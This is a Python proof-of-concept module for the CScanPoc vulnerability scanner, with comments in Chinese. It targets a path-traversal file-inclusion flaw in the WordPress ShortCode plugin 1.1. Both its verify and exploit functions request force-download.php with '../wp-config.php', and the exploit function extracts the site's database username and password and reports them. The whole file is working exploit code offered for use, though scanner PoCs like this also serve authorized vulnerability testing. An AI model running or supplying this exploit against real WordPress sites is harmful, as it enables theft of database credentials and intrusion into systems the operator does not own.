# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'WordPress_0072' # 平台漏洞编号，留空
    name = 'WordPress ShortCode Plugin 1.1 - Local File Inclusion Vulnerability' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2014-09-04'  # 漏洞公布时间
    desc = '''
        WordPress shortcode 插件1.1版本存在任意文件下载漏洞
    ''' # 漏洞描述
    ref = 'http://sebug.net/vuldb/ssvid-87214' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress ShortCode Plugin 1.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6899b189-5c0f-4ccf-a53f-2bb0b94a51a8'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            payload = "/wp/wp-content/force-download.php?file=../wp-config.php"

            vul_url = '{target}'.format(target=self.target)+payload
            resp = urllib2.urlopen(vul_url)
            content = resp.read()
            
            if ("DB_PASSWORD" in content ) and ("DB_USER" in content):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))
            payload = "/wp/wp-content/force-download.php?file=../wp-config.php"

            vul_url = '{target}'.format(target=self.target)+payload
            resp = urllib2.urlopen(vul_url)
            content = resp.read()

            match_db = re.compile('define\(\'DB_[\w]+\', \'(.*)\'\);')
            data = match_db.findall(content)

            if data:
                username = data[1]
                password = data[2]
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的数据库用户名为{username} 数据库密码为{password}'.format(target=self.target,name=self.vuln.name,username=username,password=password))
        
        except Exception, e:
            self.output.info('执行异常{}'.format(e))
        

if __name__ == '__main__':
    Poc().run()